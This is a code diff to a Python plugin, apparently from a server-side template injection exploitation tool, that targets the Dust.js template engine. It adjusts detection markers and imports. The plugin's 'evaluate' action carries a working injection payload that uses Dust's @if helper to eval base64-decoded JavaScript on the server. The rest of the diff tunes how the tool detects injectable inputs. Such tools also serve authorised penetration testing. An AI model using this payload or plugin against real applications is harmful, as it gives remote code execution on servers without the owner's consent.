@@ -1,15 +1,16 @@
 from utils.loggers import log
 from plugins.languages import javascript
 from utils import rand
-from plugins.languages import bash
+from core import bash
 
 
 class Dust(javascript.Javascript):
+    header_type = "cat"
     def init(self):
         self.update_actions({
             'evaluate': {
                 'call': 'inject',
-                'evaluate': """{{@if cond=\"eval(Buffer('{code_b64p}', 'base64').toString())\"}}{{/if}}"""
+                'evaluate': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}"""
             },
             'write': {
                 'call': 'evaluate',
@@ -45,14 +46,14 @@ class Dust(javascript.Javascript):
             payload = f'{rand.randstrings[0]}{{!qwe!}}' \
                       f'{{#x a="{rand.randstrings[2]}" b="{rand.randstrings[1]}"}}{{:else}}{{b}}{{a}}{{/x}}'
             expected = f'{rand.randstrings[0]}{rand.randstrings[1]}{rand.randstrings[2]}'
-            header_rand = rand.randint_n(10)
-            header = str(header_rand)
-            trailer_rand = rand.randint_n(10)
-            trailer = str(trailer_rand)
+            header_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
+            header = '{header[0]}{{!123!}}{header[1]}'
+            trailer_rand = [rand.randint_n(10,4),rand.randint_n(10,4)]
+            trailer = '{trailer[0]}{{!123!}}{trailer[1]}'
             if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                      trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper):
-                self.set('header', '{header}')
-                self.set('trailer', '{trailer}')
+                self.set('header', '{header[0]}{{!123!}}{header[1]}')
+                self.set('trailer', '{trailer[0]}{{!123!}}{trailer[1]}')
                 self.set('prefix', prefix)
                 self.set('suffix', suffix)
                 self.set('wrapper', wrapper)
